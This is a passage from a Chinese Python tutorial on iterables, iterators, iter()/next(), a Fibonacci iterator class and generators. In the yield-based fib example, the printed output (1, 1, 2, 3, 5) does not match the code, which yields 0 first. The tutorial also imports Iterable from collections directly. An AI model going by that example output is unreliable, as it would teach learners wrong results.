MyList容器的对象也是不能迭代的</span></span><br></pre></td></tr></table></figure><p>我们自定义了一个容器类型MyList，在将一个存放了多个数据的MyList对象放到for…in…的语句中，发现for…in…并不能从中依次取出一条数据返回给我们，也就说我们随便封装了一个可以存放多条数据的类型却并不能被迭代使用。</p><p>我们把可以通过for…in…这类语句迭代读取一条数据供我们使用的对象称之为可迭代对象（Iterable）**。</p><h2 id="2-如何判断一个对象是否可以迭代"><a href="#2-如何判断一个对象是否可以迭代" class="headerlink" title="2. 如何判断一个对象是否可以迭代"></a>2. 如何判断一个对象是否可以迭代</h2><p>可以使用 isinstance() 判断一个对象是否是 Iterable 对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">50</span>]: <span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"></span><br><span class="line">In [<span class="number">51</span>]: isinstance([], Iterable)</span><br><span class="line">Out[<span class="number">51</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">52</span>]: isinstance(&#123;&#125;, Iterable)</span><br><span class="line">Out[<span class="number">52</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">53</span>]: isinstance(<span class="string">'abc'</span>, Iterable)</span><br><span class="line">Out[<span class="number">53</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">54</span>]: isinstance(mylist, Iterable)</span><br><span class="line">Out[<span class="number">54</span>]: <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">55</span>]: isinstance(<span class="number">100</span>, Iterable)</span><br><span class="line">Out[<span class="number">55</span>]: <span class="literal">False</span></span><br></pre></td></tr></table></figure><h2 id="3-可迭代对象的本质"><a href="#3-可迭代对象的本质" class="headerlink" title="3. 可迭代对象的本质"></a>3. 可迭代对象的本质</h2><p>我们分析对可迭代对象进行迭代使用的过程，发现每迭代一次（即在for…in…中每循环一次）都会返回对象中的下一条数据，一直向后读取数据直到迭代了所有数据后结束。那么，在这个过程中就应该有一个“人”去记录每次访问到了第几条数据，以便每次迭代都可以返回下一条数据。我们把这个能帮助我们进行数据迭代的“人”称为<strong>迭代器(Iterator)</strong>。</p><p>可迭代对象的本质就是可以向我们提供一个这样的中间“人”即迭代器帮助我们对其进行迭代遍历使用。</p><p>可迭代对象通过<code>__iter__</code>方法向我们提供一个迭代器，我们在迭代一个可迭代对象的时候，实际上就是先获取该对象提供的一个迭代器，然后通过这个迭代器来依次获取对象中的每一个数据.</p><p>那么也就是说，一个具备了<code>__iter__</code>方法的对象，就是一个可迭代对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">MyList</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="meta">... </span>            self.container = []</span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, item)</span>:</span></span><br><span class="line"><span class="meta">... </span>            self.container.append(item)</span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="meta">... </span>            <span class="string">"""返回一个迭代器"""</span></span><br><span class="line"><span class="meta">... </span>            <span class="comment"># 我们暂时忽略如何构造一个迭代器对象</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mylist = MyList()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance(mylist, Iterable)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="comment"># 这回测试发现添加了__iter__方法的mylist对象已经是一个可迭代对象了</span></span><br></pre></td></tr></table></figure><h2 id="4-iter-函数与next-函数"><a href="#4-iter-函数与next-函数" class="headerlink" title="4. iter()函数与next()函数"></a>4. iter()函数与next()函数</h2><p><strong>list、tuple等都是可迭代对象，我们可以通过iter()函数获取这些可迭代对象的迭代器。然后我们可以对获取到的迭代器不断使用next()函数来获取下一条数据。</strong>iter()函数实际上就是调用了可迭代对象的<code>__iter__</code>方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>li = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">55</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>li_iter = iter(li)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(li_iter)</span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(li_iter)</span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(li_iter)</span><br><span class="line"><span class="number">33</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(li_iter)</span><br><span class="line"><span class="number">44</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(li_iter)</span><br><span class="line"><span class="number">55</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(li_iter)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">StopIteration</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p><strong>注意，当我们已经迭代完最后一个数据之后，再次调用next()函数会抛出StopIteration的异常，来告诉我们所有数据都已迭代完成，不用再执行next()函数了。</strong></p><h2 id="5-如何判断一个对象是否是迭代器"><a href="#5-如何判断一个对象是否是迭代器" class="headerlink" title="5. 如何判断一个对象是否是迭代器"></a>5. 如何判断一个对象是否是迭代器</h2><p>可以使用 isinstance() 判断一个对象是否是 Iterator 对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">56</span>]: <span class="keyword">from</span> collections <span class="keyword">import</span> Iterator</span><br><span class="line"></span><br><span class="line">In [<span class="number">57</span>]: isinstance([], Iterator)</span><br><span class="line">Out[<span class="number">57</span>]: <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">58</span>]: isinstance(iter([]), Iterator)</span><br><span class="line">Out[<span class="number">58</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">59</span>]: isinstance(iter(<span class="string">"abc"</span>), Iterator)</span><br><span class="line">Out[<span class="number">59</span>]: <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="6-迭代器Iterator"><a href="#6-迭代器Iterator" class="headerlink" title="6. 迭代器Iterator"></a>6. 迭代器Iterator</h2><p>通过上面的分析，我们已经知道，迭代器是用来帮助我们记录每次迭代访问到的位置，当我们对迭代器使用next()函数的时候，迭代器会向我们返回它所记录位置的下一个位置的数据。实际上，在使用next()函数的时候，调用的就是迭代器对象的<code>__next__</code>方法（Python3中是对象的<code>__next__</code>方法，Python2中是对象的next()方法）。<strong>所以，我们要想构造一个迭代器，就要实现它的<strong>next</strong>方法</strong>。但这还不够，python要求迭代器本身也是可迭代的，所以我们还要为迭代器实现<code>__iter__</code>方法，而<code>__iter__</code>方法要返回一个迭代器，迭代器自身正是一个迭代器，所以迭代器的<code>__iter__</code>方法返回自身即可。</p><p><strong>一个实现了<strong>iter</strong>方法和<strong>next</strong>方法的对象，就是迭代器。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyList</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""自定义的一个可迭代对象"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.items = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, val)</span>:</span></span><br><span class="line">        self.items.append(val)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        myiterator = MyIterator(self)</span><br><span class="line">        <span class="keyword">return</span> myiterator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyIterator</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""自定义的供上面可迭代对象使用的一个迭代器"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, mylist)</span>:</span></span><br><span class="line">        self.mylist = mylist</span><br><span class="line">        <span class="comment"># current用来记录当前访问到的位置</span></span><br><span class="line">        self.current = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current &lt; len(self.mylist.items):</span><br><span class="line">            item = self.mylist.items[self.current]</span><br><span class="line">            self.current += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> item</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    mylist = MyList()</span><br><span class="line">    mylist.add(<span class="number">1</span>)</span><br><span class="line">    mylist.add(<span class="number">2</span>)</span><br><span class="line">    mylist.add(<span class="number">3</span>)</span><br><span class="line">    mylist.add(<span class="number">4</span>)</span><br><span class="line">    mylist.add(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> mylist:</span><br><span class="line">        print(num)</span><br></pre></td></tr></table></figure><h2 id="7-for…in…循环的本质"><a href="#7-for…in…循环的本质" class="headerlink" title="7. for…in…循环的本质"></a>7. for…in…循环的本质</h2><p>for <strong>item</strong> in <strong>Iterable</strong> 循环的本质就是先通过iter()函数获取可迭代对象Iterable的迭代器，然后对获取到的迭代器不断调用next()方法来获取下一个值并将其赋值给item，当遇到StopIteration的异常后循环结束。</p><h2 id="8-迭代器的应用场景"><a href="#8-迭代器的应用场景" class="headerlink" title="8. 迭代器的应用场景"></a>8. 迭代器的应用场景</h2><p>我们发现迭代器最核心的功能就是可以通过next()函数的调用来返回下一个数据值。如果每次返回的数据值不是在一个已有的数据集合中读取的，而是通过程序按照一定的规律计算生成的，那么也就意味着可以不用再依赖一个已有的数据集合，也就是说不用再将所有要迭代的数据都一次性缓存下来供后续依次读取，这样可以节省大量的存储（内存）空间。</p><p>举个例子，比如，数学中有个著名的斐波拉契数列（Fibonacci），数列中第一个数为0，第二个数为1，其后的每一个数都可由前两个数相加得到：</p><p>0, 1, 1, 2, 3, 5, 8, 13, 21, 34, …</p><p>现在我们想要通过for…in…循环来遍历迭代斐波那契数列中的前n个数。那么这个斐波那契数列我们就可以用迭代器来实现，每次迭代都通过数学计算来生成下一个数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FibIterator</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""斐波那契数列迭代器"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :param n: int, 指明生成数列的前n个数</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.n = n</span><br><span class="line">        <span class="comment"># current用来保存当前生成到数列中的第几个数了</span></span><br><span class="line">        self.current = <span class="number">0</span></span><br><span class="line">        <span class="comment"># num1用来保存前前一个数，初始值为数列中的第一个数0</span></span><br><span class="line">        self.num1 = <span class="number">0</span></span><br><span class="line">        <span class="comment"># num2用来保存前一个数，初始值为数列中的第二个数1</span></span><br><span class="line">        self.num2 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""被next()函数调用来获取下一个数"""</span></span><br><span class="line">        <span class="keyword">if</span> self.current &lt; self.n:</span><br><span class="line">            num = self.num1</span><br><span class="line">            self.num1, self.num2 = self.num2, self.num1+self.num2</span><br><span class="line">            self.current += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""迭代器的__iter__返回自身即可"""</span></span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    fib = FibIterator(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> fib:</span><br><span class="line">        print(num, end=<span class="string">" "</span>)</span><br></pre></td></tr></table></figure><h2 id="9-并不是只有for循环能接收可迭代对象"><a href="#9-并不是只有for循环能接收可迭代对象" class="headerlink" title="9. 并不是只有for循环能接收可迭代对象"></a>9. 并不是只有for循环能接收可迭代对象</h2><p>除了for循环能接收可迭代对象，list、tuple等也能接收。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">li = list(FibIterator(<span class="number">15</span>))</span><br><span class="line">print(li)</span><br><span class="line">tp = tuple(FibIterator(<span class="number">6</span>))</span><br><span class="line">print(tp)</span><br></pre></td></tr></table></figure><h1 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h1><h2 id="1-生成器"><a href="#1-生成器" class="headerlink" title="1. 生成器"></a>1. 生成器</h2><p>利用迭代器，我们可以在每次迭代获取数据（通过next()方法）时按照特定的规律进行生成。但是我们在实现一个迭代器时，关于当前迭代到的状态需要我们自己记录，进而才能根据当前状态生成下一个数据。为了达到记录当前状态，并配合next()函数进行迭代使用，我们可以采用更简便的语法，即<strong>生成器(generator)。生成器是一类特殊的迭代器</strong>。</p><h2 id="2-创建生成器方法1"><a href="#2-创建生成器方法1" class="headerlink" title="2. 创建生成器方法1"></a>2. 创建生成器方法1</h2><p>要创建一个生成器，有很多种方法。第一种方法很简单，只要把一个列表生成式的 [ ] 改成 ( )</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">15</span>]: L = [ x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: L</span><br><span class="line">Out[<span class="number">16</span>]: [<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">17</span>]: G = ( x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">In [<span class="number">18</span>]: G</span><br><span class="line">Out[<span class="number">18</span>]: &lt;generator object &lt;genexpr&gt; at <span class="number">0x7f626c132db0</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">19</span>]:</span><br></pre></td></tr></table></figure><p>创建 L 和 G 的区别仅在于最外层的 [ ] 和 ( ) ， L 是一个列表，而 G 是一个生成器。我们可以直接打印出列表L的每一个元素，而对于生成器G，我们可以按照迭代器的使用方法来使用，即可以通过next()函数、for循环、list()等方法使用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">19</span>]: next(G)</span><br><span class="line">Out[<span class="number">19</span>]: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">20</span>]: next(G)</span><br><span class="line">Out[<span class="number">20</span>]: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">21</span>]: next(G)</span><br><span class="line">Out[<span class="number">21</span>]: <span class="number">4</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">22</span>]: next(G)</span><br><span class="line">Out[<span class="number">22</span>]: <span class="number">6</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">23</span>]: next(G)</span><br><span class="line">Out[<span class="number">23</span>]: <span class="number">8</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">24</span>]: next(G)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">StopIteration                             Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input<span class="number">-24</span><span class="number">-380e167</span>d6934&gt; <span class="keyword">in</span> &lt;module&gt;()</span><br><span class="line">----&gt; 1 next(G)</span><br><span class="line"></span><br><span class="line">StopIteration:</span><br><span class="line"></span><br><span class="line">In [<span class="number">25</span>]:</span><br><span class="line">In [<span class="number">26</span>]: G = ( x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">In [<span class="number">27</span>]: <span class="keyword">for</span> x <span class="keyword">in</span> G:</span><br><span class="line">   ....:     print(x)</span><br><span class="line">   ....:     </span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">28</span>]:</span><br></pre></td></tr></table></figure><h2 id="3-创建生成器方法2"><a href="#3-创建生成器方法2" class="headerlink" title="3. 创建生成器方法2"></a>3. 创建生成器方法2</h2><p>generator非常强大。如果推算的算法比较复杂，用类似列表生成式的 for 循环无法实现的时候，还可以用函数来实现。</p><p>我们仍然用上一节提到的斐波那契数列来举例，回想我们在上一节用迭代器的实现方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FibIterator</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""斐波那契数列迭代器"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :param n: int, 指明生成数列的前n个数</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.n = n</span><br><span class="line">        <span class="comment"># current用来保存当前生成到数列中的第几个数了</span></span><br><span class="line">        self.current = <span class="number">0</span></span><br><span class="line">        <span class="comment"># num1用来保存前前一个数，初始值为数列中的第一个数0</span></span><br><span class="line">        self.num1 = <span class="number">0</span></span><br><span class="line">        <span class="comment"># num2用来保存前一个数，初始值为数列中的第二个数1</span></span><br><span class="line">        self.num2 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""被next()函数调用来获取下一个数"""</span></span><br><span class="line">        <span class="keyword">if</span> self.current &lt; self.n:</span><br><span class="line">            num = self.num1</span><br><span class="line">            self.num1, self.num2 = self.num2, self.num1+self.num2</span><br><span class="line">            self.current += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""迭代器的__iter__返回自身即可"""</span></span><br><span class="line">        <span class="keyword">return</span> self</span><br></pre></td></tr></table></figure><p>注意，在用迭代器实现的方式中，我们要借助几个变量(n、current、num1、num2)来保存迭代的状态。现在我们用生成器来实现一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">30</span>]: <span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span></span><br><span class="line">   ....:     current = <span class="number">0</span></span><br><span class="line">   ....:     num1, num2 = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">   ....:     <span class="keyword">while</span> current &lt; n:</span><br><span class="line">   ....:         num = num1</span><br><span class="line">   ....:         num1, num2 = num2, num1+num2</span><br><span class="line">   ....:         current += <span class="number">1</span></span><br><span class="line">   ....:         <span class="keyword">yield</span> num</span><br><span class="line">   ....:     <span class="keyword">return</span> <span class="string">'done'</span></span><br><span class="line">   ....:</span><br><span class="line"></span><br><span class="line">In [<span class="number">31</span>]: F = fib(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">32</span>]: next(F)</span><br><span class="line">Out[<span class="number">32</span>]: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">33</span>]: next(F)</span><br><span class="line">Out[<span class="number">33</span>]: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">34</span>]: next(F)</span><br><span class="line">Out[<span class="number">34</span>]: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">35</span>]: next(F)</span><br><span class="line">Out[<span class="number">35</span>]: <span class="number">3</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">36</span>]: next(F)</span><br><span class="line">Out[<span class="number">36</span>]: <span class="number">5</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">37</span>]: next(F)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">StopIteration                             Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input<span class="number">-37</span><span class="number">-8</span>c2b02b4361a&gt; <span class="keyword">in</span> &lt;module&gt;()</span><br><span class="line">----&gt; 1 next(F)</span><br><span class="line"></span><br><span class="line">StopIteration: done</span><br></pre></td></tr></table></figure><p>在使用生成器实现的方式中，我们将原本在迭代器<code>__next__</code>方法中实现的基本逻辑放到一个函数中来实现，但是将每次迭代返回数值的return换成了yield，此时新定义的函数便不再是函数，而是一个<strong>生成器</strong>了。简单来说：只要在def函数中有yield关键字的 就称为 生成器</p><p>此时按照调用函数的方式( 案例中为F = fib(5) )使用生成器就不再是执行函数体了，而是会返回一个生成器对象（ 案例中为F ），然后就可以按照使用迭代器的方式来使用生成器了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">38</span>]: <span class="keyword">for</span> n <span class="keyword">in</span> fib(<span class="number">5</span>):</span><br><span class="line">   ....:     print(n)</span><br><span class="line">   ....:     </span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">39</span>]:</span><br></pre></td></tr></table></figure><p>但是用for循环调用generator时，发现拿不到generator的return语句的返回值。如果想要拿到返回值，必须捕获StopIteration错误，返回值包含在StopIteration的value中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">39</span>]: g = fib(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">In [<span 